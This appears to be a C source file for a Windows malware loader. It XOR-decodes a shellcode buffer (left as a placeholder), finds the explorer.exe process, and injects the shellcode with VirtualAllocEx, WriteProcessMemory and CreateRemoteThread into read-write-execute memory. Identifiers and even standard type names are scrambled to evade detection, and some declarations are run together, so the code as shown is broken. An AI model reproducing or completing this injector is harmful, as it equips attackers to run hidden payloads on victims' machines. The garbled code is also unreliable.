#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
unsigned ikjjgbdgykyv encodedShellcode[]="shellcodehere";const ikjjgbdgykyvkey=0xAA;void zlgzjegwxasj(unsigned ikjjgbdgykyv *shellcode,size_t dnfjgbpqmxlh){for(size_t vttvrhstjhgk=0;vttvrhstjhgk<dnfjgbpqmxlh;vttvrhstjhgk++){shellcode[vttvrhstjhgk]^=key;}}typedef ztbytkzlkoov(WINAPI *rdyuopsgdqvq)(xffdrwjawdmn,ztbytkzlkoov,SIZE_T,DWORD,DWORD);typedef dlxuhlwzrbmm(WINAPI *rtoyzegfzdvy)(xffdrwjawdmn,ztbytkzlkoov,LPCVOID,SIZE_T,SIZE_T *);typedef xffdrwjawdmn(WINAPI *nlpdwonddrkj)(xffdrwjawdmn,LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,ztbytkzlkoov,DWORD,LPDWORD);rdyuopsgdqvq hdlwiwzqrbtz;rtoyzegfzdvy lqqiohmzwvet;nlpdwonddrkj dzgkaytqsnuc;int nuyomqvvpzlz(DWORD ddjpsgasnfvw){HMODULE rljjmvkyuibh=GetModuleHandle("kernel32.dll");hdlwiwzqrbtz=(rdyuopsgdqvq)GetProcAddress(rljjmvkyuibh,"VirtualAllocEx");lqqiohmzwvet=(rtoyzegfzdvy)GetProcAddress(rljjmvkyuibh,"WriteProcessMemory");dzgkaytqsnuc=(nlpdwonddrkj)GetProcAddress(rljjmvkyuibh,"CreateRemoteThread");xffdrwjawdmn dvuzchpczgxq=OpenProcess(PROCESS_ALL_ACCESS,FALSE,ddjpsgasnfvw);if(!dvuzchpczgxq)return -1;void *bpgxndsvzgsq=hdlwiwzqrbtz(dvuzchpczgxq,NULL,sizeof(encodedShellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);zlgzjegwxasj(encodedShellcode,sizeof(encodedShellcode));lqqiohmzwvet(dvuzchpczgxq,bpgxndsvzgsq,encodedShellcode,sizeof(encodedShellcode),NULL);dzgkaytqsnuc(dvuzchpczgxq,NULL,0,(LPTHREAD_START_ROUTINE)bpgxndsvzgsq,NULL,0,NULL);CloseHandle(dvuzchpczgxq);return 0;}DWORD fpmqdyqqohir(const ikjjgbdgykyv*procname){PROCESSENTRY32 nnsbmctpeqcr;xffdrwjawdmn xlzzypywgmgf=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);nnsbmctpeqcr.dwSize=sizeof(PROCESSENTRY32);if(Process32First(xlzzypywgmgf,&nnsbmctpeqcr)){while(Process32Next(xlzzypywgmgf,&nnsbmctpeqcr)){if(strcmp(nnsbmctpeqcr.szExeFile,procname)==0){CloseHandle(xlzzypywgmgf);return nnsbmctpeqcr.th32ProcessID;}}}CloseHandle(xlzzypywgmgf);return 0;}int main(){DWORD ddjpsgasnfvw=fpmqdyqqohir("explorer.exe");if(ddjpsgasnfvw){nuyomqvvpzlz(ddjpsgasnfvw);}return 0;}
